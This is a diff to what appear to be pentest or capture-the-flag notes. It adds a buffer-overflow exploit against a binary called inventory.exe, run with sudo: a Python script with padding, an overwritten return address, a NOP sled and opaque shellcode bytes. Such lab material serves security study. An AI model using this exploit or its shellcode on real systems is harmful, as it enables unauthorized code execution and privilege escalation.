@@ -2063,7 +2063,7 @@ COPY SHELL CODE TO SCRIPT
 	   			- generate -b '\x00' -f python
 ```
 
-SCRIPT place shellcode into script with NOP and EIG values pulled from JMP locations
+SCRIPT place shellcode into script with NOP and EIG values pulled from JMP locations FROM COMRADE
 ```
 #!/usr/bin/env python
 
@@ -2081,4 +2081,23 @@ buf += b"\x50\x79\x3a\x5d\xf8\xf0\xdb\xac\x7e"
 print(buffer+eip+nop+buf)
 ```
 
-Now RUN inventory.exe
+FROM COMRADE PULL MEM LOCATIONS
+RUN sudo ./inventory.exe <<<$(python /home/comrade/buf.py)
+```
+#!/usr/bin/env python
+buffer = "A" * 76
+eip = "\x51\x1b\xdf\xf7"
+nop = "\x90" * 15
+buf =  b""
+buf += b"\xdb\xc8\xd9\x74\x24\xf4\xbd\x54\x1e\x22\xe1\x58"
+buf += b"\x2b\xc9\xb1\x11\x31\x68\x17\x83\xe8\xfc\x03\x3c"
+buf += b"\x0d\xc0\x14\xd6\x3a\x5c\x4e\x74\x5b\x34\x5d\x1b"
+buf += b"\x2a\x23\xf5\xf4\x5f\xc4\x06\x62\x8f\x76\x6e\x1c"
+buf += b"\x46\x95\x22\x08\x45\x5a\xc3\xc8\x15\x3b\xb7\xe8"
+buf += b"\xf6\x95\x44\x8d\x6b\x98\xcf\x39\x43\x72\x66\xa4"
+buf += b"\xe9\xf3\xf5\x43\x6d\x76\x9f\xff\x5f\x06\x3b\x9d"
+buf += b"\x9f\xb1\x90\xe8\x41\xf0\x97"
+
+print(buffer+eip+nop+buf)
+
+```
